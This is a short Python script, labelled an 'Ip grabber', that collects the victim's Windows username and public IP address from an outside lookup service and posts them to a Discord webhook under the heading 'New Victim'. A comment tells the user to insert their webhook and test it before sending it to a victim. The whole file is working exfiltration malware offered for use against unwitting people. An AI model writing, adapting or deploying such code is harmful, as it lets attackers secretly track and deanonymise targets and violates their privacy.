import json, requests, os
from discord_webhook import DiscordWebhook

hook = 'Webhook-here'

pcuname = os.getenv("UserName")
r = requests.get(f'http://extreme-ip-lookup.com/json/')
geo = r.json()

info = f''' 
New Victim: `{pcuname}`
ip adress: `{geo['query']}`
'''
webhook = DiscordWebhook(url=f'{hook}', username='Ip grabber', content=f'{info}')
response = webhook.execute()
# Change the webhook to make it work. (test first before sending to victim)
